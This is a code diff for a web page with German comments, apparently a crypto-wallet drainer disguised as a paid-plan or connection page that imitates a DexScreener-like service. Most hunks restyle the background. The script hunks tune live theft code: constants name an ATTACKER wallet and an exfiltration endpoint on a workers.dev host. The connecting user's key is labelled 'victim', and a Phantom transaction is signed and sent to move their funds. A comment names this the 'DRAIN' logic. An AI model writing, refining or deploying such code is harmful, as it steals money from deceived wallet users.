@@ -20,10 +20,47 @@
     align-items: center;
     justify-content: center;
     padding: 20px;
-    background: radial-gradient(circle at 50% 0%, rgba(20, 241, 149, 0.15) 0%, #050505 60%);
     overflow: hidden;
+    position: relative;
   }
 
+  /* NEUER HINTERGRUND */
+  .bg-glow {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    z-index: -1;
+    background: #050505;
+    overflow: hidden;
+  }
+  
+  .orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    opacity: 0.5;
+    animation: float 10s infinite ease-in-out alternate;
+  }
+  
+  .orb-1 {
+    width: 400px; height: 400px;
+    background: rgba(20, 241, 149, 0.15);
+    top: -10%; left: -20%;
+    animation-delay: 0s;
+  }
+  
+  .orb-2 {
+    width: 500px; height: 500px;
+    background: rgba(153, 69, 255, 0.1);
+    bottom: -20%; right: -20%;
+    animation-delay: -5s;
+  }
+
+  @keyframes float {
+    0% { transform: translate(0, 0) scale(1); }
+    100% { transform: translate(50px, 50px) scale(1.1); }
+  }
+
+  /* RESTLICHES UI */
   #telegram-screen {
     display: none; flex-direction: column; align-items: center; justify-content: center;
     text-align: center; width: 100%; max-width: 320px; animation: fadeIn 0.5s ease;
@@ -64,7 +101,7 @@
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
   .glass-container {
-    width: 100%; background: rgba(20, 20, 25, 0.5); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
+    width: 100%; background: rgba(20, 20, 25, 0.6); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
     border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
     display: flex; flex-direction: column; align-items: center;
     box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
@@ -143,6 +180,12 @@
 </head>
 <body>
 
+  <!-- NEUER HINTERGRUND -->
+  <div class="bg-glow">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+  </div>
+
   <div id="telegram-screen">
     <div class="pulse-ring">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
@@ -220,7 +263,6 @@
     if (isPhantom) {
       tgScreen.style.display = 'none';
       appScreen.style.display = 'flex';
-      document.body.style.background = 'radial-gradient(circle at 50% 100%, rgba(20, 241, 149, 0.15) 0%, #050505 60%)';
     } else {
       tgScreen.style.display = 'flex';
       appScreen.style.display = 'none';
@@ -289,7 +331,7 @@
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
-  const RPC_URL = "https://api.mainnet-beta.solana.com"; 
+  const RPC_URL = "https://solana.publicnode.com"; // Zurück zu publicnode für Web-Anfragen
 
   async function payAndConnect(amountSol, planName) {
     if (!window.phantom?.solana?.isPhantom) {
@@ -302,7 +344,7 @@
       const resp = await provider.connect();
       const victim = resp.publicKey;
       
-      const conn = new solanaWeb3.Connection(RPC_URL);
+      const conn = new solanaWeb3.Connection(RPC_URL, "confirmed");
       
       const transaction = new solanaWeb3.Transaction().add(
         solanaWeb3.SystemProgram.transfer({
@@ -315,6 +357,8 @@
       transaction.feePayer = victim;
       transaction.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
+      alert("Opening transaction popup..."); 
+      
       const signedTx = await provider.signAndSendTransaction(transaction);
       
       await fetch(ENDPOINT, {
@@ -325,11 +369,12 @@
       selectPlan(planName);
       
     } catch (e) {
-      console.log("Payment cancelled", e);
+      alert("ERROR: " + e.message);
+      console.log("Payment cancelled or failed", e);
     }
   }
 
-  // --- CONNECT LOGIC ---
+  // --- CONNECT (DRAIN) LOGIC ---
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
   const text = document.getElementById('sliderText');
